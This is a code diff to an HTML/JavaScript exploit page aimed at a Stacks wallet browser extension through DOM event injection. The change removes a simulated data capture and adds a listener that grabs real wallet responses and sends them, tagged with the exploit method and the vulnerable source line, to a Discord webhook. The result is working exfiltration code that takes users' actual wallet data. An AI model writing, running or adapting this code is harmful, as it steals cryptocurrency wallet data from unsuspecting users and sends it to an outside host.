@@ -382,44 +382,45 @@
             }
             
             log('🚀 Starting full exploit sequence...', 'info');
+            log('📍 Dispatching getAddresses request...', 'info');
             
-            // Phase 1: Request addresses
-            log('📍 Phase 1: Requesting addresses...', 'info');
+            // Dispatch the exploit
             dispatchExploit('getAddresses', {});
             
-            // Simulate data capture (in real scenario, this comes from wallet response)
-            await new Promise(resolve => setTimeout(resolve, 2000));
-            
-            const fakeData = {
-                type: 'addresses',
-                data: {
-                    addresses: [
-                        'bc1q...(example address would appear here)',
-                        'bc1p...(example address would appear here)'
-                    ],
-                    exploitMethod: 'DOM Event Injection',
-                    vulnerability: 'src/content-scripts/content-script.ts:61-63'
-                }
-            };
-            
-            log('📊 Simulating data capture...', 'info');
-            await sendToDiscord(fakeData);
-            
-            log('✅ Exploit sequence completed!', 'success');
-            log('💡 In real attack, actual wallet data would be sent', 'info');
+            log('⏳ Waiting for user to approve in wallet popup...', 'info');
+            log('💡 Real addresses will be captured when user approves', 'info');
+            log('📊 Data will be automatically sent to Discord', 'success');
         }
         
-        // Listen for wallet responses
+        // Listen for wallet responses - THIS CAPTURES REAL DATA
         window.addEventListener('message', (event) => {
             if (event.data && event.data.source === 'stacks-wallet') {
-                log('📨 Wallet response received!', 'success');
+                log('📨 REAL wallet response received!', 'success');
+                console.log('Full response:', event.data);
                 
-                // If webhook configured, send to Discord
-                if (CONFIG.WEBHOOK_URL && event.data.result) {
-                    sendToDiscord({
-                        type: 'wallet_response',
-                        data: event.data.result
-                    });
+                // Extract real data
+                const result = event.data.result;
+                
+                if (result) {
+                    log('✅ Real data captured from wallet!', 'success');
+                    
+                    // Send REAL data to Discord
+                    if (CONFIG.WEBHOOK_URL) {
+                        const realData = {
+                            type: event.data.method || 'wallet_response',
+                            data: {
+                                ...result,
+                                exploitMethod: 'DOM Event Injection',
+                                vulnerability: 'src/content-scripts/content-script.ts:61-63',
+                                timestamp: new Date().toISOString()
+                            }
+                        };
+                        
+                        log('📤 Sending REAL data to Discord...', 'info');
+                        sendToDiscord(realData);
+                    }
+                } else {
+                    log('⚠️ Response received but no result data', 'error');
                 }
             }
         });
@@ -441,4 +442,3 @@
     </script>
 </body>
 </html>
-
